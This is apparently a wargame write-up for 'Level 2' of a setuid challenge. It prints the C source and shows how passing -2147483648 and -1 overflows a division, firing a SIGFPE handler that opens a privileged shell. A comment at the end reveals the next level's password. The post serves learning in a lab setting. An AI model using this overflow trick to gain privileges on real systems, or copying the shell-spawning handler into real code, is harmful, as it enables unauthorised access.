## Level 2:

This time we get access to the source file for the level02 program (i.e. level02.c)

```c
//a little fun brought to you by bla

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void catcher(int a)
{
    setresuid(geteuid(),geteuid(),geteuid());
	printf("WIN!\n");
    system("/bin/sh");
    exit(0);
}

int main(int argc, char **argv)
{
	puts("source code is available in level02.c\n");

    if (argc != 3 || !atoi(argv[2]))
        return 1;
    signal(SIGFPE, catcher);
    return abs(atoi(argv[1])) / atoi(argv[2]);
}
```

We can see that the setuid bit is set in the catcher function and it gives us the shell we need to proceed. To solve this we need to trigger the SIGFPE singal.

SIGFPE - (Signal Floating-Point Exception) Erroneous arithmetic operation, such as zero divide or an operation resulting in overflow (not necessarily with a floating-point operation).

To trigger this we need to make either overflow or devision by zero. Division by zero is being checked in the if statement so we need to find a way to overflow. Signed INT has 1 more negative value and abs() returns absolut value only if it exists. Using the lowest negative value for Signed INT: **-2147483648** for argv 1 and **-1** for argv 2 we get a negative number devided by a negative number which produces positive number which using these 2 numbers is **2147483648** which overflows the INT and triggers the signal() and gives us level3 shell.

```console
level2@io:/levels$ ./level02 -2147483648 -1
source code is available in level02.c

WIN!
sh-4.3$ 
```

<!-- Level 3 password => OlhCmdZKbuzqngfz -->